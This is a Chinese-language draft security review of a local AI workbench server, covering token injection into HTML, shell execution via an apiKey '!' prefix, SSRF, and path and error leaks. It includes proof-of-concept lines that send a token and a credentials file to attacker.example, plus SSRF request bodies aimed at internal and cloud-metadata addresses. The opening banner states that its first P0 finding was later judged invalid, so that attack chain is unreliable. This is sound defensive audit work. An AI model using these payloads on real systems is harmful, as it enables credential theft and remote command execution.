# Pi Workbench 安全审查报告（Phase 3）

> ## ⚠️ 阅读前必看：本文档已被主报告取代，勿单独引用
>
> 交付物是 `docs/CODE_REVIEW_2026-10.md`，本文为其安全分域的中间稿。**两处结论已被主报告修正：**
> 1. **本文 P0-1（任意网站 `<script src>` 偷 token）判定为不成立** —— 跨源 `<script>` 对
>    `Content-Type: text/html` 的响应**不会执行**（浏览器拒绝非 JS MIME 的脚本）。缺
>    `nosniff`/CSP 属实，但降为纵深加固项（主报告 P1-7）。
> 2. **本文 P0-2（`apiKey` 前缀 `!` → RCE）已修复**（`4c77a66`）—— HTTP 入口现已拒绝 `!` 前缀。
> 3. **本文的 P0-1（畸形编码远程 DoS）当时因「无法确认可触发」未报**（见 §4.3），主报告已实测复现并修复。
>
> 主报告 §6.2 完整记录了这些判断的修正过程。保留本文仅为追溯来源。

> 只读审查，未修改任何源码。审查对象：`F:\DevelopWork\WorkBuddyWork\Tiktok_auto`，**排除** `pi/`（上游 clone）、`node_modules/`、`dist/`、`build/`、`release/`、`packages/web/ui/assets/`（vite 产物）。

## 0. 实际读过的文件（全部逐行读到，行号即来自这些读取）

**core**
`packages/core/src/server.ts`（全 1149 行）、`main.ts`、`session.ts`（660–780 / 860–1015 / 1105–1174 / 1290–1349 段）、`fs-list.ts`、`fs-read.ts`、`fs-search.ts`、`prompt-files.ts`、`skills-install.ts`、`skills-search.ts`、`packages.ts`、`providers.ts`（全 1054 行）、`models.ts`、`resources.ts`、`trust.ts`、`ui-context.ts`、`guards.ts`、`contract.ts`（720–769 / 876–920 段）、`session-list-cache.ts`（375–414 段）、`sessions.ts`（grep 定位）

**desktop**
`packages/desktop/src/main.ts`（全 542 行）、`preload.ts`、`boot-env.ts`、`last-run.ts`、`packages/desktop/package.json`

**ui**
`components/common/Markdown.tsx`、`lib/highlight.ts`、`lib/image-src.ts`、`lib/feature-flags.ts`、`components/shell/PreviewPane.tsx`（180–310 / 520–585 段）、`components/chat/MessageList.tsx`（680–719 段）、`services/agent-transport.ts`（1–160 段）

**web / 文档 / 脚本**
`packages/web/bin/pi-web.mjs`、`packages/web/package.json`、`README.md`（55–104 段）、`docs/PROJECT_CONTEXT.md`（70–124 段）、`packages/core/docs/deploy.md`（全 193 行）、`packages/core/scripts/core-security-check.mjs`

---

## 1. 新发现的问题

### P0-1 · 静态 HTML 把 Bearer token 当可执行脚本发给任何来源 —— 浏览器任意网站可窃取本机 token（script gadget）

**严重度：P0**（自托管形态下可被任意网站远程利用；桌面形态下 `127.0.0.1` 仍可被任意网站 `<script src>` 打到）

**证据**

`packages/core/src/server.ts:350-363`

```ts
				let body = buf;
				if (isHtml) {
					/*
					 * 把同源 bootstrap token 注入 HTML：页面（feature-flags.getLiveConfig）优先读
					 * `window.__CORE_TOKEN__`，其次才读 `?token=`（供跨源 dev 场景覆盖）。
					 * ⇒ 用户只需要打开 `http://127.0.0.1:<port>/?live=1`，token 不再进 URL/收藏夹。
					 * 安全口径不变：Host 白名单 + Bearer 校验照旧；静态资源本就免鉴权，
					 * 注入不引入新攻击面（本机进程本就能读 run/core.json）。
					 */
					const inject = `<script>window.__CORE_TOKEN__=${JSON.stringify(token)};</script>`;
					body = Buffer.from(buf.toString("utf8").replace("</head>", `${inject}</head>`));
				}
				res.writeHead(200, { "Content-Type": isHtml ? "text/html; charset=utf-8" : contentTypeOf(file) });
				res.end(body);
```

同一段注释给出的安全论证是「**本机进程**本就能读 run/core.json」——该论证只覆盖「本机进程」，**漏掉了「任意网页」这一条路径**：

- HTML 里注入的是 `<script>` 标签，浏览器把它当**可执行脚本**处理，`<script src="http://127.0.0.1:5190/">` 属于「经典脚本」加载（classic script），**不需要 CORS 头**，跨源也能执行；
- `server.ts:361` 的响应头**没有** `X-Content-Type-Options: nosniff`、**没有** CSP、**没有** CORS/`Sec-Fetch-*` 校验，也没有「只允许顶层导航」的判定——任何 GET 请求都拿到带 token 的 HTML；
- `server.ts:385-390` 的 Host 校验对这条攻击**恰好通过**：受害者浏览器访问的是 `127.0.0.1:<port>`，发出的 `Host` 就是 `127.0.0.1:<port>`，在白名单里；
- 桌面版端口被 `last-run.json` 记忆（`packages/desktop/src/main.ts:342-355`、`516-527`）**跨启动稳定**，攻击者不需要扫端口；
- 同源页面还把 token 放在全局：`packages/ui/src/lib/feature-flags.ts:80-82`

```ts
  const token =
    params.get("token") ?? (window as { __CORE_TOKEN__?: string }).__CORE_TOKEN__ ?? "";
```

- 自托管形态更直接：`packages/core/docs/deploy.md:62`「浏览器直接开 `http://HOST:PORT/?live=1` 即可使用界面，**免 token**——core 会把 `window.__CORE_TOKEN__` 注入到托管的 index.html 里」——意味着**任意外部站点**都可以 `<script src="https://chat.example.com/">` 拿到 token。

**攻击场景（具体）**

1. 受害者装了 Pi Workbench 并打开过（core 常驻，端口 5190）；
2. 受害者在**同一台机器上访问攻击者的任意网页**（钓鱼页 / 被挂马的页面都行），页面里：

```html
<script>
  window.__CORE_TOKEN__ = "";
  function sink(t) {
    new Image().src = "https://attacker.example/leak?t=" + encodeURIComponent(t);
  }
</script>
<script src="http://127.0.0.1:5190/"></script>
<script> sink(window.__CORE_TOKEN__); </script>
```

3. token 到攻击者手里后，**从攻击者自己的机器**（桌面版仅回环，需 attacker 在本机有执行点；自托管内网形态则可从内网直接打）即可调用全部 API：`GET /fs/read?path=<任意绝对路径>`（文档明示不收敛）、`POST /cwd`、`POST /models/test` 的 `!` 命令执行（见 P0-2）→ **完整 RCE + 任意文件读**。

**修复建议与代价（小）**

`server.ts` 的 HTML 分支加三件事，任一条即可断链，建议全加（约 5 行）：

1. 注入前判「是不是顶层导航」：`req.headers["sec-fetch-mode"]` 必须为 `navigate`（或 `sec-fetch-dest` 为 `document`），否则不注入 token；老浏览器缺该头时可再要求 `req.headers.accept` 含 `text/html`；
2. HTML 响应加 `X-Content-Type-Options: nosniff`（切断 script gadget 的核心）；
3. 加 `Content-Security-Policy: script-src 'self'`（核心 UI 代码全在 `assets/*.js` 里，不依赖内联脚本，只有这行注入需要改成外链或用 nonce）。

代价：小（改 5 行 + 一次 UI 构建验证）。

---

### P0-2 · `POST /models/test` / `POST /providers/models` 把请求体里的 `apiKey` 交给 shell 执行 —— 单请求任意命令执行

**严重度：P0**（token 一泄漏即升级为 1 个 HTTP 请求 = 任意命令执行；即便不泄漏，也是「任意本机进程/同机用户 → shell」的直梯）

**证据**

`packages/core/src/providers.ts:610-624`（真正的执行点）

```ts
/** 解析 `!` / `$ENV` 插值（S2：凭证层语义，仅测试时按需解析，不落盘） */
function resolveCredential(raw: string): ResolvedCredential {
	if (!raw) return { key: "", missingEnvVars: [] };
	if (raw.startsWith("!")) {
		try {
			const shell = process.platform === "win32" ? "cmd.exe" : "/bin/sh";
			const out = execSync(raw.slice(1), { shell, timeout: 8000, encoding: "utf8" }).trim();
			return { key: out, missingEnvVars: [] };
		} catch {
			return { key: raw, missingEnvVars: [] }; // 解析失败则原样返回（测试结果自然反映鉴权失败）
		}
	}
```

`packages/core/src/server.ts:1089-1100`（入口，`apiKey` 完全来自请求体）

```ts
		if (req.method === "POST" && urlPath === "/models/test") {
			const body = (await readBody(req)) as ModelTestRequest;
			if (!body || typeof body.baseUrl !== "string" || typeof body.modelId !== "string") {
				return json(400, { error: "请求体缺少 baseUrl / modelId" });
			}
			try {
				const result = await runtime.testModel(body);
```

`packages/core/src/contract.ts:733-744` 明确把这条语义写成契约：

```ts
export interface ModelTestRequest {
  baseUrl: string;
  /** API key 原文（`!`/`$ENV` 插值由 core 解析，不落盘、不改当前选择） */
  apiKey: string;
```

调用链无任何前置条件：`server.ts:393` 只校 Bearer → `providers.ts:967` `resolveCredential(req.apiKey)` **先于** `fetch`（`providers.ts:979`）执行。不要求流式空闲、不要求配置过 models.json、不要求目录受信任。另一端 `POST /providers/models` 同构（`providers.ts:1019`）。全仓只有这一处 `execSync`（grep 全仓：`providers.ts:29,616`），所以问题边界清晰。

**攻击场景（具体）**

拿到 token 的任一主体（本机任意进程/用户读 `run/core.json`；或经 P0-1 窃取 token 的网页所有者；或自托管内网里拿到 token 的人）：

```bash
curl -s -X POST http://127.0.0.1:5190/models/test \
  -H "Authorization: Bearer <token>" -H "Host: 127.0.0.1:5190" \
  -H "Content-Type: application/json" \
  -d '{"baseUrl":"http://127.0.0.1:1","modelId":"x","api":"openai-completions",
       "apiKey":"!curl -d @$HOME/.pi/agent/models.json https://attacker.example/x"}'
```

`execSync` 在 core 进程（= 受害者账户）里执行 `cmd.exe /c`（Windows）或 `/bin/sh -c`（POSIX）——即**任意代码执行**。后面 `fetch` 打 127.0.0.1:1 失败只是噪声，命令已经跑完。

**与已文档化设计的关系（如实区分）**：`packages/core/docs/deploy.md:159` 已声明「任何拿到 token 的人都可以让 AI agent 在跑 core 的机器上执行任意 shell 命令」——那是**经对话驱动 agent 工具**的路径。本条是**与对话/模型无关的单请求 shell 执行面**，且它有独立的文档缺口：`docs/PROJECT_CONTEXT.md` 只在 §5 第 61 行写了「`apiKey` 支持 `"$ENV_VAR"` 插值」，**从未提到 `!` 前缀会在 core 进程里执行 shell**。所以：不是「文档未接受的风险」，但严重度受 deploy.md §4 那句话部分约束——我按 P0 报，因为「单请求、无任何前置条件、无日志告警」。

**修复建议与代价（小到中）**

- 小（推荐先做）：`server.ts` 的 `/models/test`、`/providers/models` 入口拒绝 `apiKey` 以 `!` 开头的请求（400 + 明确文案），把「执行本机命令」这条路从 HTTP 面彻底摘掉；副作用是 UI 的「用 `!cmd` 取凭证再测试」功能失效（保存到 models.json 仍可用，Pi 自己读磁盘时仍会解析）。
- 中：把 `!cmd` 的执行挪到一个显式开关（如 `CORE_ALLOW_CREDENTIAL_COMMAND=1`）+ 每次执行发 SSE 事件落 `events.jsonl`，默认关闭。

---

### P0-3 · `baseUrl` 无任何限制：SSRF 代理（内网探测 / 云元数据 / 携带自定义头打内网服务）

**严重度：P0**（自托管/内网形态；桌面形态为 P1——需本机有执行点或 token 泄漏）

**证据**

`packages/core/src/providers.ts:637-644`（无 host 白名单、无 scheme 限制、无内网地址拦截）

```ts
function buildTestEndpoint(baseUrl: string, api: string): string | null {
	const base = (baseUrl || "").replace(/\/+$/, "");
	if (!base) return null;
	if (api === "openai-responses") return `${base}/responses`;
	if (api === "anthropic-messages") return `${base}/messages`;
	// 默认 openai-completions
	return `${base}/chat/completions`;
}
```

`packages/core/src/providers.ts:978-1005`：`fetch(endpoint, { method: "POST", headers: buildTestHeaders(req, key), ... })`，响应**回显上游状态码与响应体前 300 字符**：

```ts
			if (!res.ok) {
				const snippet = await readErrorSnippet(res);
				...
					error: `${host} 返回 HTTP ${res.status}${res.statusText ? ` ${res.statusText}` : ""}${snippet}${hint}`,
```

`packages/core/src/providers.ts:650-663` 允许请求体自带任意 `headers`（`for (const [k, v] of Object.entries(req.headers ?? {})) headers[k] = v;`），`packages/core/src/server.ts:1103-1114` 是 `POST /providers/models` 的入口（同样只校 Bearer）。两个端点都**没有**任何 URL 校验代码（我通读了 `providers.ts` 全文，`buildTestEndpoint` / `buildModelsEndpoint` 之外没有任何 host/scheme 检查）。

**攻击场景（具体）**

token 持有者（或经 P0-1 拿到 token 的任意网站所有者，在自托管形态下从内网发起）：

1. 探测内网存活与 banner：`{"baseUrl":"http://192.168.1.1:80","apiKey":"","api":"openai-completions","modelId":"x"}` → 错误文案带 host + 上游状态码 + 响应体片段；
2. 打云元数据：`{"baseUrl":"http://169.254.169.254/latest/meta-data/iam","api":"openai-responses",...}` → 拿 `GET .../responses` 的结果片段；
3. 用受害者出口 IP 打外部/内网服务：`headers` 可自定义（含 `Host`、`X-Forwarded-For`、`Cookie`），`apiKey` 会被放进 `Authorization: Bearer`——等于一个受控的、带凭证注入的 HTTP 客户端。

**修复建议与代价（中）**

在 `buildTestEndpoint` / `buildModelsEndpoint` 前加一层 `assertSafeUpstream(url)`：只允许 `http/https`；解析 host 后拒绝 `127.0.0.0/8`、`::1`、`169.254.0.0/16`、`10/8`、`172.16/12`、`192.168/16`、`0.0.0.0`、`.local`；若产品确实需要「测本机 llama.cpp/ollama」，加白名单开关（`CORE_ALLOW_LOOPBACK_UPSTREAM=1`）。代价：中（需要一个 ~30 行的 IPv4/IPv6 地址判定 + 一次误杀回归）。

---

### P1-1 · `GET /providers` 把 `apiKey` 明文回给前端，并被 `console.error` 打上日志

**严重度：P1**（token 泄漏后的二次泄漏：把用户在 models.json 里内联的**上游密钥**一起交出去；日志侧另行泄漏）

**证据**

`packages/core/src/providers.ts:528-537`（`apiKey: asString(rec.apiKey)` 原样进响应体）

```ts
function nativeProviderToEntry(id: string, rec: NativeProviderRecord): Omit<ProviderEntry, "id" | "enabled"> {
	const models = Array.isArray(rec.models) ? (rec.models as NativeModelRecord[]) : [];
	return {
		name: asString(rec.name, id),
		baseUrl: asString(rec.baseUrl),
		apiKey: asString(rec.apiKey),
```

`packages/core/src/providers.ts:16-17` 把它写成有意设计：

```ts
 * 5. **凭证层语义（S2）**：apiKey 存原文即可（文件层 credential-blind，零展开风险）；
 *    `GET /providers` 按 D6 原文返回、不脱敏；`POST /models/test` 时才按 `!`/`$ENV` 解析以真正连测。
```

`packages/core/src/skills-install.ts:171`（git stderr 全文进日志，另一条凭证泄漏面；同文件其余路径已统一改成「只带 errno code」）

```ts
			console.error(`[skills-install] git clone 失败（exit ${code}）：${repoUrl}\n${stderr.trim()}`);
```

`*` 补充：`docs/PROJECT_CONTEXT.md` 与 `deploy.md` 都**没有**记这条「明文回显 apiKey」的口径（只有源码注释记的 D6）。

**攻击场景**：拿到 token 者 `GET /providers` 一次即得全部上游 `apiKey`（可冒用账户、持续计费）；在自托管形态下，若 core 的 stdout 被收集（systemd journal / docker logs / 反代日志），git clone 失败时私有仓库 URL 与认证失败原文也会落进去。

**修复建议（小）**：响应体里把 `apiKey` 换成掩码（保留前 4 后 4 或 `"$ENV_VAR"` / `"!cmd"` 形态原样），UI 侧 `ProviderForm` 已按「留空 = 不修改」语义（改一处需要同步 `PUT /providers` 的合并逻辑：空/掩码值视为「保留磁盘原值」）。

---

### P1-2 · 项目扩展信任门出厂默认 `always`：`POST /cwd` 指向任意目录即加载并执行该目录的 `.pi/extensions/*`

**严重度：P1**（需 token；但把「token → 代码执行」从「需要 agent 跑一次工具」压缩成「一次 POST」）

**证据**

`packages/core/src/trust.ts:135-138`（未配置即 `always`，不是注释里写的 `ask`）

```ts
export function readTrustPolicy(settingsManager: SettingsManager): TrustPolicy {
	const policy = settingsManager.getGlobalSettings().defaultProjectTrust ?? "always";
	return { ask: policy === "ask", policy };
}
```

`packages/core/src/trust.ts:167-169`（`always` 直接放行，**不提问**）

```ts
	// 归一化后的三态分派（`policy`：未配置按 `always` 收尾，见 `readTrustPolicy`）
	if (defaultProjectTrust === "always") return done(true, "always");
```

`packages/core/src/trust.ts:37-39` 明确记录了这是一次**有意的安全基线翻转**：

```ts
 * ① 只翻**默认值**，不翻**安全兜底** —— `ask` 态下超时/无人应答/异常仍一律按不信任收尾；
```

`packages/core/src/session.ts:694-709`（`loader.reload({ resolveProjectTrust })` 里就是调它）+ `packages/core/src/session.ts:889-897`（`POST /cwd` 走 `bootProject(target)`）。对照 `packages/core/scripts/core-security-check.mjs:28`：**项目自己的安全自检脚本**显式写 `defaultProjectTrust: "never"` —— 即项目测试时都不用它出厂的默认值。

**攻击场景**：token 持有者（或经 P0-1 的网页所有者，若其有办法发带 Bearer 的请求）先把 `C:\Users\Public\poc\.pi\extensions\x.ts`（或 GitHub 上随便一个仓库 clone 下来）准备好，`POST /cwd {"dir":"C:\\Users\\Public\\poc"}` → core 的 `bootProject` → `loader.reload` → `resolveProjectTrust` 返回 `always` → 扩展被加载执行 = 任意代码执行；不需要 `POST /prompt`、不需要模型配置。

**修复建议（小）**：把 `?? "always"` 改回 `?? "ask"`（或引入一次性「首次运行询问」），UI 侧开关语义保持。代价：小（1 行 + 一条文档更新），但有产品行为变更，需产品裁决。

---

### P2-1 · Host 白名单比对大小写敏感 + 缺失 `::1`

**严重度：P2**（当前不构成可利用绕过：只用一个 Host 头的浏览器无法伪造 Host；但白名单判定与 DNS 主机名语义不符，属「假阴性/假阳性」双向风险）

**证据**

`packages/core/src/server.ts:229-238`

```ts
/** 从 Host 头取主机名：`1.2.3.4:5190` → `1.2.3.4`；`[::1]:5190` → `::1`；`localhost` → `localhost` */
function hostnameOf(hostHeader: string): string {
	const h = hostHeader.trim();
	if (h.startsWith("[")) {
		const end = h.indexOf("]");
		return end >= 0 ? h.slice(1, end) : h;
	}
	const colon = h.indexOf(":");
	return colon >= 0 ? h.slice(0, colon) : h;
}
```

`packages/core/src/server.ts:382-390`（`allowed.includes(...)`，两侧都没有 `toLowerCase()`）

```ts
		const allowed = opts.allowedHosts ?? ["127.0.0.1", "localhost"];
		// ② 防 DNS rebinding：校验 Host 头（对所有请求生效，含静态资源）
		const host = req.headers["host"];
		if (!host || !allowed.includes(hostnameOf(host))) {
```

判定结果：`Host: LOCALHOST:5190` / `Host: LocalHost` → 403（假阴性，纯 IP 与全小写域名不受影响）；`http://[::1]:PORT` 一律 403（`main.ts:72` 的白名单只有 `127.0.0.1`/`localhost`）。多条 Host 头的情况：Node 把重复头合并成 `a, b`，`hostnameOf` 取第一段冒号前的内容，`"127.0.0.1, evil.com"` 不在白名单 → **fail-closed**（这一点是对的）。

**修复建议（小）**：`allowed.includes(hostnameOf(host).toLowerCase())`，`allowedHosts` 装载时统一小写；白名单默认加 `::1`（`main.ts:72`）。

---

### P2-2 · 错误响应把 `String(e)` / `e.message` 原样回给客户端（内部路径、errno、堆栈片段）

**严重度：P2**

**证据**（`server.ts` 内多处同型）

```ts
565:				return json(500, { ok: false, error: e instanceof Error ? e.message : String(e) });
544:				return json(500, { ok: false, error: e instanceof Error ? e.message : String(e) });
601:				if (e instanceof FsSearchError) return json(e.status, { ok: false, error: e.message });
```

同类：`server.ts:656`、`670`、`681`、`714`、`728`、`799`（`skills/search` 上游错误原文）、`843`、`869`、`886`、`908`、`930`、`939`、`954`、`963`、`976`、`1015`、`1029`、`1041`、`1056`、`1073`、`1084`、`1098`、`1112`。

注意这与 `skills-install.ts` 的既有纪律**相反**：`skills-install.ts:212-216`、`240-243`、`296-301`、`466-474` 都专门把裸 `e.message` 换成「只带 errno code」，理由是「它含 `/tmp/pi-skill-install-*/repo` 内部路径，会经 server.ts 的 `{ error }` → UI 直出」。也就是说：**这一层的清洗在 skills-install 做了，server.ts 的兜底分支没有统一收口**，其余模块（`providers.ts:488`、`providers.ts:496`、`session-list-cache` 等）仍会把内部路径交给客户端。审查价值在于：这不是「某一处的疏漏」，而是缺少一个统一的「对外错误文案」出口。

**攻击场景**：token 持有者用非法参数把各端点打到 500，收集 core 的工作目录、agentDir、临时目录、Node 错误类型——为后续利用（P0-2 的命令拼接、P0-3 的 SSRF 目标选择）做信息准备；在自托管形态下这些错误还可能进反代访问日志。

**修复建议（小）**：给 `server.ts` 加一个 `errorText(e)` 辅助函数（`SkillInstallError`/`DirListError` 等已分类错误照旧；其余只回 errno code 或固定文案，细节走 `console.error`）。代价：小（单文件收口，需要顺手回归各 500 分支的文案断言）。

---

### P2-3 · `GET /sessions?all=1` 读跨项目会话文件（能力比 CR-018 声明更宽的「另一条越界读」）

**严重度：P2**

**证据**

`packages/core/src/server.ts:610-618`

```ts
		if (req.method === "GET" && urlPath === "/sessions") {
			const all = url.searchParams.get("all") === "1";
			try {
				const sessions = await runtime.listSessions({ all });
```

`packages/core/src/session-list-cache.ts:611-617`

```ts
function selectEntries(sessionDir: string | undefined, cwd: string, all: boolean): Array<{ path: string; info: CacheInfo }> {
...
    if (!all) {
```

`packages/core/src/session-list-cache.ts:384`（会话根固定在 `<agentDir>/sessions`，与 cwd 无关）

```ts
  return { sessionsRoot: path.join(agentDir, "sessions"), agentDir };
```

配合 `packages/core/src/sessions.ts:557` 的 `readSession` / `sessions.ts:598` 的 `loadSessionById`，token 持有者可以先 `?all=1` 列出**本机所有项目**的历史会话，再 `POST /sessions/load {"id":...}` 把任意一个读成消息树（含历史 prompt、工具输出、图片定位三元组）。

**为什么算新发现**：`docs/PROJECT_CONTEXT.md:83`（CR-018）只声明了 `/fs/list|read|search` 三条越界读；`/sessions?all=1` 是**第四条**，且它读的不是任意文件而是「任意 Pi 项目的会话内容」。风险等级低于 CR-018（目标集合限定在 `<agentDir>/sessions/**`，且都是用户自己的会话），故 P2。

**修复建议（小）**：`?all=1` 加开关（`CORE_ALLOW_CROSS_PROJECT_SESSIONS=1`）或默认只列当前 cwd；也可以只对 `all=1` 要求额外的一个 header。

---

### P2-4 · `/fs/search` 的 git 分支对 `ls-files` 输出做 `path.join(target, ...rel.split("/"))`，含 `..` 段时可越出目标目录

**严重度：P2**（可利用面窄：Windows 上 git 不允许路径段以点结尾或含 `..`，因此主要影响 POSIX 上、且搜索根是攻击者可控的 git 仓库时的**信息泄漏**，不是读写任意文件）

**证据**

`packages/core/src/fs-search.ts:193-206`

```ts
		candidates = [
			...viaGit.map((rel) => ({
				absPath: path.join(target, ...rel.split("/")),
				relPath: rel,
```

`rel` 直接来自 `git ls-files -coz` 的输出（`fs-search.ts:82-98`），**没有对 `..` 段过滤**；`walk` 分支（`fs-search.ts:101-125`）不跟随符号链接、也不会产出 `..`，所以只有 git 分支有这个形状。命中后会经 `GET /fs/search` 响应把 `absPath`/`relPath` 交给调用方（`fs-search.ts:235-243`）。

**修复建议（小）**：在 git 分支 map 前过滤掉 `rel.split("/").includes("..")` 的条目（同时跳过绝对路径段），或改用 `path.resolve(target, rel)` 后校验 `startsWith(target + path.sep)`。

---

### P2-5 · token 走 `?token=` 的既有豁免（`/sessions/image`）：`server.ts` 无 `Referrer-Policy`，token 会进 URL 日志/DOM

**严重度：P2**（**复核既有设计**，不是新 bug；结论：当前浏览器侧不可利用，但缺一层纵深）

**证据**

`packages/core/src/server.ts:395-414`（豁免与理由、比对口径都写在注释里）

```ts
			// 唯一豁免：`/sessions/image` 额外接受 `?token=`（2026-10-01 图片预览批次）。
...
			const queryToken =
				urlPath === "/sessions/image" ? url.searchParams.get("token") ?? "" : "";
```

`packages/ui/src/lib/image-src.ts:50-61`（token 拼进 `<img src>`）

**我实测核对过的缓解事实**（用来给这条定级，避免照抄文档）：

1. `packages/ui/src/components/common/Markdown.tsx:87-91` 的外链是 `target="_blank" rel="noreferrer"` —— **Referer 不会带给外链**；
2. 文档 URL 本身不带 token（token 只在 `window.__CORE_TOKEN__` 与 img 的 query 里），所以 markdown 图片/外链触发的 Referer 是 `http://127.0.0.1:5190/`（无 query）——不泄漏 token；
3. `server.ts` 的静态与 API 响应都没有 `Referrer-Policy`（`server.ts:361`、`422-425`），所以「不泄漏」靠的是 `rel="noreferrer"` 这一个点，而不是服务端策略——一旦将来有人给 markdown 图片改成 `<a>`/`window.open` 无 noreferrer，token 就会外流。

**修复建议（小）**：所有响应加 `Referrer-Policy: no-referrer`（1 行，纵深）；`/sessions/image` 可考虑改为「一次性短时 ticket」而不是复用主 token。

---

### P2-6 · token 比对是非常量时间比较

**严重度：P2**（诚实结论：当前不可利用，仅作加固建议）

**证据** `packages/core/src/server.ts:415`

```ts
			if ((!auth || auth !== `Bearer ${token}`) && queryToken !== token) {
```

`!==` 短路提前返回，理论上存在计时侧信道。但：token 是 `randomUUID()`（`server.ts:274` 的 `opts.token ?? randomUUID()`，`main.ts:63` 同源），≈122 bit 熵，经 HTTP/本机回环的抖动做逐字节爆破不现实；token 比对还不是热路径上的唯一变量。因此**不建议**把它列为漏洞，只作为「换成 `crypto.timingSafeEqual`（长度不等先返回 false）」的一行加固。

---

## 2. 已文档化接受设计的复核（CR-018：`/fs/*` 不收敛到 `CORE_CWD`）

### 2.1 文档原话

`docs/PROJECT_CONTEXT.md:83`：

> **`/fs/*` 路径边界（2026-09-30 用户裁决，CR-018 选项 B：文档声明接受、零代码改动）**：`/fs/list|read|search` 与其它端点一样要求 Bearer token，但**不收敛到 `CORE_CWD`** —— 持 token 者可访问本机**任意绝对路径**（实测 `GET /fs/read?path=/etc/hostname` 即返回内容）。

### 2.2 复核结论：**陈述准确，且比文档描述更宽（宽在「不止这三条」和「不止只读」两处）**

| 文档说的 | 代码实际 | 证据 |
|---|---|---|
| `/fs/list\|read\|search` 不收敛 cwd | **属实**：三者都是 `path.resolve(expandHome(raw.trim()) \|\| fallbackCwd)`，`raw` 来自 query 参数，无任何 cwd 前缀校验 | `fs-list.ts:99`、`fs-read.ts:82`、`fs-search.ts:167`；`server.ts:555-603` |
| 「只读」 | **属实但不在 `/fs/*` 上封顶**：`/fs/*` 确实只读（`fs.statSync`/`readdirSync`/`openSync("r")`，无写调用） | `fs-list.ts:103,111`；`fs-read.ts:86,99` |
| 暗示「越界读就这三条」 | **不准确，至少还有 2 条**：`/sessions?all=1` 跨项目读全部会话（P2-3）；`/sessions/load` 可把任一会话读成完整消息树 | `server.ts:610-618`、`session-list-cache.ts:384,611-617` |
| 「任意绝对路径」的读 | **准确**；额外注意 `~` 会被展开成 home（`fs-list.ts:62-66`），且 `/fs/list?include=files` 会列出**文件名**（含 System32、`C:\Users\*`），等于一台机器的目录枚举器 | `fs-list.ts:14,137`；`server.ts:557` |
| — | **「可写而不只是读」的越界路径存在于别处**：`POST /cwd {"dir":"<任意绝对路径>"}` 把 core 的 cwd 换过去（`session.ts:875-882` 只校验「存在且是目录」），随后 `POST /skills/install {scope:"project"}` 就写到 `<该目录>/.pi/skills/`（`session.ts:1316-1324`），`scope:"user"` 写到 `<agentDir>/skills/`。也就是说：**写越界是存在的，只是经由 `/cwd` 换根，而不是经由 `/fs/*` 直接写**——文档 §5 的「只读」措辞会让人误以为「写路径一律被 cwd 约束」 | `session.ts:875-897`、`1316-1324`、`skills-install.ts:418,440-459` |

**（b）桌面版实际场景下的真实风险面**

- **token 的窃取途径（按可实现性排序）**：
  1. **任意网页经 script gadget 直接读走**（P0-1，最严重，且无需本机执行点）；
  2. **同机任意进程/用户读 `run/core.json`**：`main.ts:155-160` 落盘 `mode: 0o600` + `chmodQuiet`。**POSIX 上有效**（`packages/core/scripts/file-perms-check.mjs:175` 有断言）；**Windows 上 `fs.chmodSync` 只是设置了只读位，ACL 不变** → 实际保护来自用户 profile 目录的继承 ACL。本机多用户/共享账户场景下，「同机其它用户读 token」这条防线在 Windows 上比文档暗示的弱（`main.ts:29-36` 的 `chmodQuiet` 注释自己也承认「win32 无 POSIX 权限语义」）。
  3. **静态 HTML 的 token 注入面**：不只 `<script>`——`GET /` 与任何未知路径（SPA 回退，`server.ts:372-374`）都会返回带 token 的 HTML，所以「本机随便一个 HTTP 客户端」都能拿到 token，这本来就是设计接受的（`server.ts:353-356` 注释）。
- **同源页面注入 token 的机制是否可被 XSS 利用**：`window.__CORE_TOKEN__` 一旦被注入，等价于把全权 token 交给该 origin 的任意脚本。我逐条查了渲染侧，**没有找到可用的 XSS 落点**（详见 §3「检查过但没发现问题的项」），所以**当前链路是：token 注入面本身可被任意网站经 script 标签利用（P0-1），而不是经 XSS 利用**。
- **桌面形态的额外弱点**：桌面壳把 core 钉死在回环（`boot-env.ts:85-86` 的 `CORE_HOST=127.0.0.1` + `CORE_ALLOWED_HOSTS=""`）——这是对的，且 CR-072 的白名单化确实堵住了「宿主 `CORE_HOST=0.0.0.0` 污染内嵌 core」。但**回环不等于安全边界**：任意网站的 `<script src>` 就在回环上（P0-1）。`CORE_HOST=0.0.0.0` 的自托管形态暴露面更大：静态 shell 无鉴权 + token 在 HTML 里 → 任一能访问到该端口的内网主机都能拿 token，**前提是**它能构造白名单内的 Host（`deploy.md:60` 要求把客户端访问用的主机名/IP 加进白名单，所以内网 IP 是被显式放行的）。

**（c）最小加固成本方案（按性价比排序）**

1. **切断 token 的跨源可执行性**（P0-1，5 行）：`nosniff` + `Sec-Fetch-Mode: navigate` 判定 + CSP `script-src 'self'` —— **这一条就把 P0-1 从「任意网站」降为「本机进程」**，把整个 CR-018 的风险面收敛回文档假设的那个威胁模型（本机进程本来就能读 core.json）。
2. **`/fs/*` 收敛 cwd + 例外开关**（CR-018 选项 A，中）：`path.resolve` 后校验 `startsWith(cwd + path.sep)`，越界返回 403；把「浏览任意路径」做成显式开关 `CORE_FS_ALLOW_OUTSIDE_CWD=1`（UI 侧 DirectoryPickerDialog 已有「输入绝对路径」交互，开关关闭时提示）。代价：中（`fs-list` 的盘符枚举、`~` 展开、`/fs/read` 的 403 语义、以及 3 个 check 脚本 `fs-list-check.mjs` / `fs-search-check.mjs` 的断言都要同步）。
3. **把 `/cwd` + `/skills/install` 的写路径显式纳入文档**（小）：至少让 §5 那句「只读」不要被读成「写路径受 cwd 约束」——`POST /cwd` 能换根，换完根就能写入该根。
4. **`apiKey` 掩码回显**（P1-1，小）与 **`!` 命令执行隔离**（P0-2，小）：让「token 泄漏」的后果从「RCE + 上游密钥」降为「文件读写 + 驱动 agent」。

---

## 3. 检查过但**没有发现问题**的项（明确记录，避免重复审）

| 检查项 | 结论 | 证据 |
|---|---|---|
| `API_ROUTES` 单点鉴权是否有漏网路由 | **无漏网**：`server.ts:393` 的 `Set.has(urlPath)` 在**任何 handler 之前**执行；路由分派全部用 `urlPath`（`new URL().pathname`，已规范化：`/a/../health`→`/health`、`%68ealth`→`/health`、`?` 被剥离、尾斜杠不匹配任何 handler、`urlPath` 从不做字符串前缀匹配） | `server.ts:377-379`、`109-165`、`393`、`1120-1122` |
| 路由匹配能否被绕过 | **不能**：`API_ROUTES.has` 是精确匹配，没有 `startsWith`/正则；未声明路径的 GET 只走静态（不含任何数据） | `server.ts:1120-1129` |
| token 生成 | **安全**：`randomUUID()`（CSPRNG） | `server.ts:274`、`main.ts:63` |
